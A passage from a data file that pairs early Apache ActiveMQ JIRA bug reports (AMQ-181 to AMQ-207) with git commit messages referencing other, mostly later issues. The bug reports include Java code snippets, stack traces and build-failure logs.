Total blocked: 162  Total waited: 10 152

Stack trace: 
java.lang.Object.wait(Native Method)
java.lang.Object.wait(Object.java:474)
EDU.oswego.cs.dl.util.concurrent.PooledExecutor.awaitTerminationAfterShutdown(Unknown Source)
org.codehaus.activemq.util.ExecutorHelper.stopExecutor(ExecutorHelper.java:50)
org.codehaus.activemq.transport.TransportChannelSupport.stopExecutor(TransportChannelSupport.java:472)
org.codehaus.activemq.transport.tcp.TcpTransportChannel.stop(TcpTransportChannel.java:196)
org.codehaus.activemq.broker.impl.BrokerClientImpl.close(BrokerClientImpl.java:658)
org.codehaus.activemq.broker.impl.BrokerClientImpl.onException(BrokerClientImpl.java:134)
org.codehaus.activemq.transport.TransportChannelSupport.onAsyncException(TransportChannelSupport.java:430)
org.codehaus.activemq.transport.tcp.TcpTransportChannel.doAsyncSend(TcpTransportChannel.java:438)
org.codehaus.activemq.transport.tcp.TcpTransportChannel$1.run(TcpTransportChannel.java:233)
EDU.oswego.cs.dl.util.concurrent.PooledExecutor$Worker.run(Unknown Source)
java.lang.Thread.run(Thread.java:595)

",6b18edc77133cafbf9297ec5e2991f09ccf1243b,"add test for https://issues.apache.org/activemq/browse/AMQ-2084 that works just fine

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@953739 13f79535-47bb-0310-9956-ffa450edef68"
12483911,AMQ-207,"The logic in CompositeTransportChannel.establishConnection appears incorrcet.

...
                if (incrementTimeout && time < maximumTimeout) {
                    time *= 2;
                    time = time > maximumTimeout ? maximumTimeout : timeout;
                }
...

should be:

...
                if (incrementTimeout && time < maximumTimeout) {
                    time *= 2;
                    time = time > maximumTimeout ? maximumTimeout : time;
                }

Otherwise if zeroconfig fails to get a connection, the sleep time is approx. 30s.
",76b7822cf27204648e8bcf6d5497a3f3758c77f5,"AMQ-2078 extend transaction tests to xa in ra -- missed the pom.xml mod

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@735913 13f79535-47bb-0310-9956-ffa450edef68"
12483911,AMQ-207,"The logic in CompositeTransportChannel.establishConnection appears incorrcet.

...
                if (incrementTimeout && time < maximumTimeout) {
                    time *= 2;
                    time = time > maximumTimeout ? maximumTimeout : timeout;
                }
...

should be:

...
                if (incrementTimeout && time < maximumTimeout) {
                    time *= 2;
                    time = time > maximumTimeout ? maximumTimeout : time;
                }

Otherwise if zeroconfig fails to get a connection, the sleep time is approx. 30s.
",7f5e6667f4b2e281bd7a6011a8054775f2b4dbc3,"partial fix for AMQ-2075

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@745480 13f79535-47bb-0310-9956-ffa450edef68"
12483911,AMQ-207,"The logic in CompositeTransportChannel.establishConnection appears incorrcet.

...
                if (incrementTimeout && time < maximumTimeout) {
                    time *= 2;
                    time = time > maximumTimeout ? maximumTimeout : timeout;
                }
...

should be:

...
                if (incrementTimeout && time < maximumTimeout) {
                    time *= 2;
                    time = time > maximumTimeout ? maximumTimeout : time;
                }

Otherwise if zeroconfig fails to get a connection, the sleep time is approx. 30s.
",ce4c065f75dd2649bfba3e8a717c3bc6914edac0,"Fix for https://issues.apache.org/activemq/browse/AMQ-2071 and 
https://issues.apache.org/activemq/browse/AMQ-2070

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@813424 13f79535-47bb-0310-9956-ffa450edef68"
12481079,AMQ-206,"We have beans defined that are abstract and cannot be instantiated.  

JCAContainer attempts to instantiate all beans with:

            for (int i = 0; i < names.length; i++) {
                // TODO one day we could be smart to only pre-load the correct
                // types of bean, based on the definitions?
                String name = names[i];
                beanFactory.getBean(name);
            }

Result is a BeanIsAbstractException:

org.springframework.beans.factory.BeanIsAbstractException: Error creating bean with name 'baseXlParser': Bean definition is abstract
	at org.springframework.beans.factory.support.AbstractBeanFactory.checkMergedBeanDefinition(AbstractBeanFactory.java:653)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:145)
	at org.codehaus.activemq.jca.JCAContainer.afterPropertiesSet(JCAContainer.java:77)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1065)

Perhaps something like:

      } else if (!lazyLoad && beanFactory instanceof BeanDefinitionRegistry) {
         BeanDefinitionRegistry registry = (BeanDefinitionRegistry) beanFactory;
         String[] names = registry.getBeanDefinitionNames();
         for (int i = 0; i < names.length; i++) {
            String name = names[i];
            BeanDefinition definition = registry.getBeanDefinition(name);
            if (!definition.isAbstract())
               beanFactory.getBean(name);
         }
      }

The TO-DO in the code is well stated, what logic can be implemented to selectively get the necesssay beans?  The end result is that lazy-init singletons will be instantiated as well, perhaps without cause.

Also, I believe the code should use BeanFactoryUtils.beanNamesIncludingAncestors(ListableBeanFactory) to account for a potential hierarchy.

Note I found reference to this exact issue in the Spring Forum (http://forum.springframework.org/viewtopic.php?t=3064) but was unable to find an existing jira issue.

Thanks,

Andrew


",0b34f3c89f807fe4a76423df00c0a7cc528007ff,"resolve AMQ-2062 - add setExceptionListener to amq connection factory

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@733803 13f79535-47bb-0310-9956-ffa450edef68"
12481079,AMQ-206,"We have beans defined that are abstract and cannot be instantiated.  

JCAContainer attempts to instantiate all beans with:

            for (int i = 0; i < names.length; i++) {
                // TODO one day we could be smart to only pre-load the correct
                // types of bean, based on the definitions?
                String name = names[i];
                beanFactory.getBean(name);
            }

Result is a BeanIsAbstractException:

org.springframework.beans.factory.BeanIsAbstractException: Error creating bean with name 'baseXlParser': Bean definition is abstract
	at org.springframework.beans.factory.support.AbstractBeanFactory.checkMergedBeanDefinition(AbstractBeanFactory.java:653)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:145)
	at org.codehaus.activemq.jca.JCAContainer.afterPropertiesSet(JCAContainer.java:77)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1065)

Perhaps something like:

      } else if (!lazyLoad && beanFactory instanceof BeanDefinitionRegistry) {
         BeanDefinitionRegistry registry = (BeanDefinitionRegistry) beanFactory;
         String[] names = registry.getBeanDefinitionNames();
         for (int i = 0; i < names.length; i++) {
            String name = names[i];
            BeanDefinition definition = registry.getBeanDefinition(name);
            if (!definition.isAbstract())
               beanFactory.getBean(name);
         }
      }

The TO-DO in the code is well stated, what logic can be implemented to selectively get the necesssay beans?  The end result is that lazy-init singletons will be instantiated as well, perhaps without cause.

Also, I believe the code should use BeanFactoryUtils.beanNamesIncludingAncestors(ListableBeanFactory) to account for a potential hierarchy.

Note I found reference to this exact issue in the Spring Forum (http://forum.springframework.org/viewtopic.php?t=3064) but was unable to find an existing jira issue.

Thanks,

Andrew


",2deea18cc24e4f144f2ebf8d1365de9ea3ba382d,"applied patch from https://issues.apache.org/activemq/browse/AMQ-2068 with thanks

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@734981 13f79535-47bb-0310-9956-ffa450edef68"
12481096,AMQ-204,"Using a queue browser with a transacted session.  The number of messages the that browser sees changes if you vary if you are sending persistent or non persistent messages.

Test case added to CVS but commented out.  See:

http://cvs.activemq.codehaus.org/viewrep/activemq/activemq/modules/core/src/test/org/codehaus/activemq/JmsQueueTransactionTest.java?r=1.3#l125",0728ec9e757970daf18416d716b64ad079d9faca,"https://issues.apache.org/activemq/browse/AMQ-2042 - added handling of 'no disk space' in default handler

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@882144 13f79535-47bb-0310-9956-ffa450edef68"
12481046,AMQ-202,<NA>,63709a9a886a104312a2733adf8af7c24593f198,"test for setBatch with KahaDB AMQ-2020

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@741325 13f79535-47bb-0310-9956-ffa450edef68"
12481307,AMQ-199,"I am using an embedded broker.

I used this code :

MessageContainerAdmin[] admins = activeMQConnectionFactory.getBrokerContainer().getBroker().getBrokerAdmin().listMessageContainerAdmin();
for (int i = 0; i < admins.length; i++) {
  MessageContainerAdmin admin = admins[i];
  if (admin.getDestinationName().equals(queueName)) {
    admin.empty();
  }
}

All messages appear to have been removed from the queue.  The following exception occurs during the admin.empty() method call.

Exception in thread ""Dispatch Worker"" java.lang.NullPointerException
	at java.io.ByteArrayInputStream.<init>(ByteArrayInputStream.java:89)
	at org.codehaus.activemq.io.AbstractWireFormat.fromBytes(AbstractWireFormat.java:127)
	at org.codehaus.activemq.store.jdbc.JDBCMessageStore.getMessage(JDBCMessageStore.java:97)
	at org.codehaus.activemq.store.journal.JournalMessageStore.getMessage(JournalMessageStore.java:190)
	at org.codehaus.activemq.store.cache.CacheMessageStore.getMessage(CacheMessageStore.java:80)
	at org.codehaus.activemq.service.impl.DurableQueueMessageContainer.getMessage(DurableQueueMessageContainer.java:136)
	at org.codehaus.activemq.service.impl.SubscriptionImpl.getMessagesToDispatch(SubscriptionImpl.java:341)
	at org.codehaus.activemq.service.impl.DispatchWorker.dispatchMessages(DispatchWorker.java:154)
	at org.codehaus.activemq.service.impl.DispatchWorker.run(DispatchWorker.java:108)",0d2172bc9b5d75e97b7b004c074221807326046a,"apply threadName filter feature patch for AMQ-1993

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@710061 13f79535-47bb-0310-9956-ffa450edef68"
12481169,AMQ-195,"When using networked brokers like e.g remote://reliable:tcp://remotebrokerhost:61616, the URI parameters such as maximumRetries and failureSleepTime should be propagated to the underlying channel. This is not the case today as properties are populated on RemoteTransportChannel instances which do not expose setters for these properties.

This makes these topologies much less useful. :)",4d6043aa94227b4b2604394e0c855c9869c211f4,"fix regression AMQ-1959

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@700746 13f79535-47bb-0310-9956-ffa450edef68"
12481169,AMQ-195,"When using networked brokers like e.g remote://reliable:tcp://remotebrokerhost:61616, the URI parameters such as maximumRetries and failureSleepTime should be propagated to the underlying channel. This is not the case today as properties are populated on RemoteTransportChannel instances which do not expose setters for these properties.

This makes these topologies much less useful. :)",92e143155b636dd2a6f6730fb5c65dbb8d1ec970,"a test variant to validate AMQ-1957

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@712117 13f79535-47bb-0310-9956-ffa450edef68"
12481042,AMQ-194,"The o.c.a.manaement.Resettable.reset() does not work because the objects that extend the o.c.a.management.StatsImpl do no override the getStatistics() method.  Without the override none of the contained stats objects are ever reset.

I created overrides for the o.c.a.m.JMSConnectionStatsImpl, o.c.a.m.JMSSessionStatsImpl, o.c.a.m.JMSConsumerStatsImpl and o.c.a.m.JMSProducerStatsImpl to gather and return all member stats objects.  While this does allow the objects to be reset, I also relealized that the reset() functionality works in a manner opposing the other mutating methods.  Reset works from the top down while other mutators work from the bottom up.  This could cause some inconsistances in info at the different levels.  It might be wise to change the other mutators to work top down updating through their parent before self updates.  That way the methods could be synchronized and prevent the inconsistances.",4d0e57261cf613fb62e6cf45f6e47452abf84230,"Fix for https://issues.apache.org/activemq/browse/AMQ-1943

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@697953 13f79535-47bb-0310-9956-ffa450edef68"
12481042,AMQ-194,"The o.c.a.manaement.Resettable.reset() does not work because the objects that extend the o.c.a.management.StatsImpl do no override the getStatistics() method.  Without the override none of the contained stats objects are ever reset.

I created overrides for the o.c.a.m.JMSConnectionStatsImpl, o.c.a.m.JMSSessionStatsImpl, o.c.a.m.JMSConsumerStatsImpl and o.c.a.m.JMSProducerStatsImpl to gather and return all member stats objects.  While this does allow the objects to be reset, I also relealized that the reset() functionality works in a manner opposing the other mutating methods.  Reset works from the top down while other mutators work from the bottom up.  This could cause some inconsistances in info at the different levels.  It might be wise to change the other mutators to work top down updating through their parent before self updates.  That way the methods could be synchronized and prevent the inconsistances.",9fe716b99f7bc5a4a509753211e57b9e4ab40bb5,"adding test case for https://issues.apache.org/activemq/browse/AMQ-1949

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@698175 13f79535-47bb-0310-9956-ffa450edef68"
12481174,AMQ-193,"In the class org.codehaus.activemq.management.JMSEndpointStatsImpl the following getter should be exposed to provide access to the throughput statistic as is possible for the others.

public TimeStatistic getMessageRateTime() {
    return messageRateTime;
}",2b28443a05a542c5030d4fa6da785f7ff068fd9b,"Added test case for https://issues.apache.org/activemq/browse/AMQ-1936

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@777803 13f79535-47bb-0310-9956-ffa450edef68"
12481174,AMQ-193,"In the class org.codehaus.activemq.management.JMSEndpointStatsImpl the following getter should be exposed to provide access to the throughput statistic as is possible for the others.

public TimeStatistic getMessageRateTime() {
    return messageRateTime;
}",1d5440a1cd6239b10312c612171cd004949b476c,"reopen https://issues.apache.org/activemq/browse/AMQ-1936 - excluded test case as it hangs on some linux machines ... needs to be ivestigated further

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@779556 13f79535-47bb-0310-9956-ffa450edef68"
12481174,AMQ-193,"In the class org.codehaus.activemq.management.JMSEndpointStatsImpl the following getter should be exposed to provide access to the throughput statistic as is possible for the others.

public TimeStatistic getMessageRateTime() {
    return messageRateTime;
}",ff3edb4a81f34a49924d8f85af0811eae93d07e2,"https://issues.apache.org/activemq/browse/AMQ-1933 - unsubscribing REST consumers

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@996910 13f79535-47bb-0310-9956-ffa450edef68"
12481385,AMQ-191,"I have the following configuration
- 1 Producer (P)
- 1 Consumer (C)
- 1 Broker
- ActiveMQ 2.0
- DerbyDB Persistence

======================
With reliable protocol:
  P ----> sends 20000 messages ------> AMQ ----> Sends  1331 Messages  ----> C

  After the test I browsing the persistence with ij tool and don't see any messages!!!!

>java -Dderby.system.home=/export/home/jms/activemq/var -Dij.connection.derbydb=jdbc:derby:derbydb org.apache.derby.tools.ij
        ij version 10.0 (C) Copyright IBM Corp. 1997, 2004.
        DERBYDB* -      jdbc:derby:derbydb
        * = current connection
        ij> select container,COUNT(*) as quantity  from ACTIVEMQ_MSGS group by container;
        CONTAINER  |QUANTITY
        ------------------------------------
        0 rows selected
        ij> select * from  activemq_msgs;
        ID|CONTAINER |MSGID |MSG
        ------------------------------------
        0 rows selected

======================
Without reliable protocol
  P-->Sends 20000 messages-->AMQ-->Sends 20000 Messages--> C

the details logs from ActiveMQ 2.0, Consumer  and Producer are in http://www.gps.cl/logs.zip (133Kb)",f5703497dd61ca4ebb48bdb6e3b9658f28c4bfeb,"Fix for https://issues.apache.org/activemq/browse/AMQ-1919

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@691124 13f79535-47bb-0310-9956-ffa450edef68"
12481385,AMQ-191,"I have the following configuration
- 1 Producer (P)
- 1 Consumer (C)
- 1 Broker
- ActiveMQ 2.0
- DerbyDB Persistence

======================
With reliable protocol:
  P ----> sends 20000 messages ------> AMQ ----> Sends  1331 Messages  ----> C

  After the test I browsing the persistence with ij tool and don't see any messages!!!!

>java -Dderby.system.home=/export/home/jms/activemq/var -Dij.connection.derbydb=jdbc:derby:derbydb org.apache.derby.tools.ij
        ij version 10.0 (C) Copyright IBM Corp. 1997, 2004.
        DERBYDB* -      jdbc:derby:derbydb
        * = current connection
        ij> select container,COUNT(*) as quantity  from ACTIVEMQ_MSGS group by container;
        CONTAINER  |QUANTITY
        ------------------------------------
        0 rows selected
        ij> select * from  activemq_msgs;
        ID|CONTAINER |MSGID |MSG
        ------------------------------------
        0 rows selected

======================
Without reliable protocol
  P-->Sends 20000 messages-->AMQ-->Sends 20000 Messages--> C

the details logs from ActiveMQ 2.0, Consumer  and Producer are in http://www.gps.cl/logs.zip (133Kb)",932ddd2318b883e07208a4047e1e80d2718b1352,"Fix for https://issues.apache.org/activemq/browse/AMQ-1915

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@691130 13f79535-47bb-0310-9956-ffa450edef68"
12481220,AMQ-190,"The following test case fails:

        connection.setClientID(getName());
        connection.start();
        Session session = connection.createSession(false, Session.CLIENT_ACKNOWLEDGE);
        Topic topic = session.createTopic(""topic-""+getName());
        MessageConsumer consumer = session.createDurableSubscriber(topic, ""sub1"");
        // Drain any messages that may allready be in the sub
        while( consumer.receive(1000)!=null )
            ;

        // See if the durable sub works in a new session.
        session.close();
        session = connection.createSession(false, Session.CLIENT_ACKNOWLEDGE);

        // Send a Message that should be added to the durable sub.
        MessageProducer producer = createProducer(session, topic);
        producer.send(session.createTextMessage(""Message 1""));

        // Activate the durable sub now.  And receive the message.
        consumer = session.createDurableSubscriber(topic, ""sub1"");
        Message msg = consumer.receive(1000);
        assertNotNull(msg);        
        assertEquals( ""Message 1"", ((TextMessage)msg).getText()  );",a6553354714965741a66df3f1be72d18d2f085bb,"further enhancement for AMQ-1904 to add helper method to extract the Map of all user properties

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@687864 13f79535-47bb-0310-9956-ffa450edef68"
12481220,AMQ-190,"The following test case fails:

        connection.setClientID(getName());
        connection.start();
        Session session = connection.createSession(false, Session.CLIENT_ACKNOWLEDGE);
        Topic topic = session.createTopic(""topic-""+getName());
        MessageConsumer consumer = session.createDurableSubscriber(topic, ""sub1"");
        // Drain any messages that may allready be in the sub
        while( consumer.receive(1000)!=null )
            ;

        // See if the durable sub works in a new session.
        session.close();
        session = connection.createSession(false, Session.CLIENT_ACKNOWLEDGE);

        // Send a Message that should be added to the durable sub.
        MessageProducer producer = createProducer(session, topic);
        producer.send(session.createTextMessage(""Message 1""));

        // Activate the durable sub now.  And receive the message.
        consumer = session.createDurableSubscriber(topic, ""sub1"");
        Message msg = consumer.receive(1000);
        assertNotNull(msg);        
        assertEquals( ""Message 1"", ((TextMessage)msg).getText()  );",686bfcf4967fdada0298433e7d48c142054b812f,"fix for: https://issues.apache.org/jira/browse/AMQ-1907

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1296711 13f79535-47bb-0310-9956-ffa450edef68"
12481090,AMQ-189,"Attempting to build by executing
> maven
in main project directory.

Receive the following...

==================================================================
==================================================================
ActiveMQ :: Assembly
+----------------------------------------
| Executing default ActiveMQ :: Integration Tests :: Ejb
| Memory: 6M/10M
+----------------------------------------
Attempting to download geronimo-spec-ejb-2.1-rc3.jar.
WARNING: Failed to download geronimo-spec-ejb-2.1-rc3.jar.

BUILD FAILED
File...... C:\Documents and Settings\bconlon\.maven\cache\maven-multiproject-plugin-1.3.1\plugin.jelly
Element... maven:reactor
Line...... 217
Column.... 9
The build cannot continue because of the following unsatisfied dependency:

geronimo-spec-ejb-2.1-rc3.jar; version override doesn't exist: 2.1-rc3

Total time: 22 seconds
Finished at: Mon Feb 07 11:35:18 CST 2005
==================================================================
==================================================================

This version of geronimo-spec-ejb isn't in ibiblio or in any obvious place on apache or codehaus.  If I remove the ""ejb"" module, the build
will fail as follows:

==================================================================
==================================================================
+----------------------------------------
| Executing default ActiveMQ :: Transport :: HTTP
| Memory: 10M/12M
+----------------------------------------
Attempting to download geronimo-spec-servlet-2.4-rc3.jar.
WARNING: Failed to download geronimo-spec-servlet-2.4-rc3.jar.
Attempting to download org.mortbay.jetty-5.1-SNAPSHOT.jar.

BUILD FAILED
File...... C:\Documents and Settings\bconlon\.maven\cache\maven-multiproject-plu
gin-1.3.1\plugin.jelly
Element... maven:reactor
Line...... 217
Column.... 9
The build cannot continue because of the following unsatisfied dependency:

geronimo-spec-servlet-2.4-rc3.jar; version override doesn't exist: 2.4-rc3

Total time: 42 seconds
Finished at: Mon Feb 07 11:44:28 CST 2005
==================================================================
==================================================================",479f5e1713282f652f9eb7d9fe5a34edad058c9d,"Fix for MySQL DB tables should be INNODB based for proper tx support: https://issues.apache.org/activemq/browse/AMQ-1891


git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@686264 13f79535-47bb-0310-9956-ffa450edef68"
12481090,AMQ-189,"Attempting to build by executing
> maven
in main project directory.

Receive the following...

==================================================================
==================================================================
ActiveMQ :: Assembly
+----------------------------------------
| Executing default ActiveMQ :: Integration Tests :: Ejb
| Memory: 6M/10M
+----------------------------------------
Attempting to download geronimo-spec-ejb-2.1-rc3.jar.
WARNING: Failed to download geronimo-spec-ejb-2.1-rc3.jar.

BUILD FAILED
File...... C:\Documents and Settings\bconlon\.maven\cache\maven-multiproject-plugin-1.3.1\plugin.jelly
Element... maven:reactor
Line...... 217
Column.... 9
The build cannot continue because of the following unsatisfied dependency:

geronimo-spec-ejb-2.1-rc3.jar; version override doesn't exist: 2.1-rc3

Total time: 22 seconds
Finished at: Mon Feb 07 11:35:18 CST 2005
==================================================================
==================================================================

This version of geronimo-spec-ejb isn't in ibiblio or in any obvious place on apache or codehaus.  If I remove the ""ejb"" module, the build
will fail as follows:

==================================================================
==================================================================
+----------------------------------------
| Executing default ActiveMQ :: Transport :: HTTP
| Memory: 10M/12M
+----------------------------------------
Attempting to download geronimo-spec-servlet-2.4-rc3.jar.
WARNING: Failed to download geronimo-spec-servlet-2.4-rc3.jar.
Attempting to download org.mortbay.jetty-5.1-SNAPSHOT.jar.

BUILD FAILED
File...... C:\Documents and Settings\bconlon\.maven\cache\maven-multiproject-plu
gin-1.3.1\plugin.jelly
Element... maven:reactor
Line...... 217
Column.... 9
The build cannot continue because of the following unsatisfied dependency:

geronimo-spec-servlet-2.4-rc3.jar; version override doesn't exist: 2.4-rc3

Total time: 42 seconds
Finished at: Mon Feb 07 11:44:28 CST 2005
==================================================================
==================================================================",dad506decbc27f54852efd52c19120f788a842d2,"Patch applied for https://issues.apache.org/activemq/browse/AMQ-1892

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@692449 13f79535-47bb-0310-9956-ffa450edef68"
12481090,AMQ-189,"Attempting to build by executing
> maven
in main project directory.

Receive the following...

==================================================================
==================================================================
ActiveMQ :: Assembly
+----------------------------------------
| Executing default ActiveMQ :: Integration Tests :: Ejb
| Memory: 6M/10M
+----------------------------------------
Attempting to download geronimo-spec-ejb-2.1-rc3.jar.
WARNING: Failed to download geronimo-spec-ejb-2.1-rc3.jar.

BUILD FAILED
File...... C:\Documents and Settings\bconlon\.maven\cache\maven-multiproject-plugin-1.3.1\plugin.jelly
Element... maven:reactor
Line...... 217
Column.... 9
The build cannot continue because of the following unsatisfied dependency:

geronimo-spec-ejb-2.1-rc3.jar; version override doesn't exist: 2.1-rc3

Total time: 22 seconds
Finished at: Mon Feb 07 11:35:18 CST 2005
==================================================================
==================================================================

This version of geronimo-spec-ejb isn't in ibiblio or in any obvious place on apache or codehaus.  If I remove the ""ejb"" module, the build
will fail as follows:

==================================================================
==================================================================
+----------------------------------------
| Executing default ActiveMQ :: Transport :: HTTP
| Memory: 10M/12M
+----------------------------------------
Attempting to download geronimo-spec-servlet-2.4-rc3.jar.
WARNING: Failed to download geronimo-spec-servlet-2.4-rc3.jar.
Attempting to download org.mortbay.jetty-5.1-SNAPSHOT.jar.

BUILD FAILED
File...... C:\Documents and Settings\bconlon\.maven\cache\maven-multiproject-plu
gin-1.3.1\plugin.jelly
Element... maven:reactor
Line...... 217
Column.... 9
The build cannot continue because of the following unsatisfied dependency:

geronimo-spec-servlet-2.4-rc3.jar; version override doesn't exist: 2.4-rc3

Total time: 42 seconds
Finished at: Mon Feb 07 11:44:28 CST 2005
==================================================================
==================================================================",54a152039391c15f13507f23630169b2784b8fa3,"add test that validates https://issues.apache.org/activemq/browse/AMQ-1893 is resolved on trunk

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@964051 13f79535-47bb-0310-9956-ffa450edef68"
12481183,AMQ-188,"We implemented a Communication-Protocol handling a Simple Client/Server Connection (using temp-queues) .. we are transporting image-tiles through this Queues. It seems that, if the images reacg a certain size (not specified at the moment) the whole Broker seems to block and does not accept any messages anymore .. therefore the client seems to block too .. 
Any ideas what this could cause ??",20972bfdaf9e9602fa6f3b799118ce7ee1bff0b6,"https://issues.apache.org/activemq/browse/AMQ-1886 - another test, but issue cannot be reproduced with embeded derby

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@820268 13f79535-47bb-0310-9956-ffa450edef68"
12481130,AMQ-187,"Due to a Problem with Version 1.5 (see other Commit) we tried using Version 2.0. Using Version 2.0 we permanently get an ""failed to build body from bytes"" Error. 

As fas as we analyzed, this normally seems to happen if there is a serilalisation/deserialisation Problem .. but in this Case the Broker, the ""Client"" and the ""Server"" are using all the Same machine/jdk/classes. 

We are simply ""transporting"" an Array of Tile-Requests as the Body of an ObjectMessage (see the Class below). In the Error-Case it seems that the Object-Body of the Message itself is being lost. 
The Message sent by the Client still contains the Object .. the Message received by the Server seems to have lost it's contents.

Any comments/ideas ??


8<-----------------8<----------------8<----------------8<----------
public class TileRequest implements Serializable {
  private Serializable segmentHandle;
  private RenderContext renderContext;
  private Rectangle tile;

public TileRequest(Serializable segmentHandle, RenderContext    
      renderContext, Rectangle tile) {
    this.segmentHandle = segmentHandle;
    this.renderContext = renderContext;
    this.tile = tile;
  }

  public RenderContext getRenderContext() {
    return renderContext;
  }

  public Serializable getSegmentHandle() {
    return segmentHandle;
  }

  public Rectangle getTileRectangle() {
    return tile;
  }
}",026c120094936a9a0fc179deac98951a74723b2d,"test for http://issues.apache.org/activemq/browse/AMQ-1873 - stomp toon many open files

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@828954 13f79535-47bb-0310-9956-ffa450edef68"
12481072,AMQ-184,"Failure in test when building:

Testsuite: org.codehaus.activemq.transport.activeio.ExceptionListenerTest
Tests run: 1, Failures: 1, Errors: 0, Time elapsed: 4.679 sec

------------- Standard Output ---------------
Created connection: org.codehaus.activemq.ActiveMQConnection@781f6226
Failed to close connection: javax.jms.JMSException: asyncSend failed: java.net.SocketException: Socket closed
------------- ---------------- ---------------
------------- Standard Error -----------------
javax.jms.JMSException: asyncSend failed: java.net.SocketException: Socket closed
        at org.codehaus.activemq.util.JMSExceptionHelper.newJMSException(JMSExceptionHelper.java:49)
        at org.codehaus.activemq.transport.activeio.ActiveIOTransportChannel.doAsyncSend(ActiveIOTransportChannel.java:124)
        at org.codehaus.activemq.transport.TransportChannelSupport.asyncSendWithReceipt(TransportChannelSupport.java:158)
        at org.codehaus.activemq.transport.TransportChannelSupport.send(TransportChannelSupport.java:143)
        at org.codehaus.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:916)
        at org.codehaus.activemq.ActiveMQConnection.sendConnectionInfoToBroker(ActiveMQConnection.java:1132)
        at org.codehaus.activemq.ActiveMQConnection.close(ActiveMQConnection.java:553)
        at org.codehaus.activemq.transport.activeio.ExceptionListenerTest.tearDown(ExceptionListenerTest.java:81)
        at junit.framework.TestCase.runBare(TestCase.java:130)
        at junit.framework.TestResult$1.protect(TestResult.java:106)
        at junit.framework.TestResult.runProtected(TestResult.java:124)
        at junit.framework.TestResult.run(TestResult.java:109)
        at junit.framework.TestCase.run(TestCase.java:118)
        at junit.framework.TestSuite.runTest(TestSuite.java:208)
        at junit.framework.TestSuite.run(TestSuite.java:203)
        at org.apache.tools.ant.taskdefs.optional.junit.JUnitTestRunner.run(JUnitTestRunner.java:325)
        at org.apache.tools.ant.taskdefs.optional.junit.JUnitTestRunner.main(JUnitTestRunner.java:536)
Caused by: java.net.SocketException: Socket closed
        at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:99)
        at java.net.SocketOutputStream.write(SocketOutputStream.java:136)
        at org.activeio.packet.ByteArrayPacket.writeTo(ByteArrayPacket.java:100)
        at org.activeio.net.SocketSynchChannel.write(SocketSynchChannel.java:134)
        at org.activeio.adapter.SynchToAsynchChannelAdapter.write(SynchToAsynchChannelAdapter.java:183)
        at org.codehaus.activemq.transport.activeio.ActiveIOTransportChannel.doAsyncSend(ActiveIOTransportChannel.java:114)
        ... 15 more
------------- ---------------- ---------------
Testcase: testFailingConnection(org.codehaus.activemq.transport.activeio.ExceptionListenerTest):        FAILED
Should have been notified of an exception
junit.framework.AssertionFailedError: Should have been notified of an exception
        at org.codehaus.activemq.transport.activeio.ExceptionListenerTest.testFailingConnection(ExceptionListenerTest.java:45)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)",f9b668b05ba1be525804ae043ff3eacc4ab0435e,"added initial spike of using Protocol Buffer as the wire format for https://issues.apache.org/activemq/browse/AMQ-1843

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@674837 13f79535-47bb-0310-9956-ffa450edef68"
12481157,AMQ-181,"The binary distribution unit is missing the commons-beanutils-1.6.1.jar file.  This file is specified as a dependancy in core.  It needed when a client specifies parameters in a connection URL.


Connecting to URL: reliable:tcp://localhost:61616?keepAliveTimeout=60000
Consuming topic: TOOL.DEFAULT
Using non-durable subscription
2005-01-25 18:21:20,094 [main           ] DEBUG BeanUtils                      - Cannot find: org.apache.commons.beanutils.BeanUtils. Reason: java.lang.ClassNotFoundException: org.apache.commons.beanutils.BeanUtils
java.lang.ClassNotFoundException: org.apache.commons.beanutils.BeanUtils
        at java.net.URLClassLoader$1.run(URLClassLoader.java:199)
        at java.security.AccessController.doPrivileged(Native Method)
        at java.net.URLClassLoader.findClass(URLClassLoader.java:187)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:289)
        at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:274)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:235)
        at org.codehaus.activemq.util.BeanUtils.populate(BeanUtils.java:41)
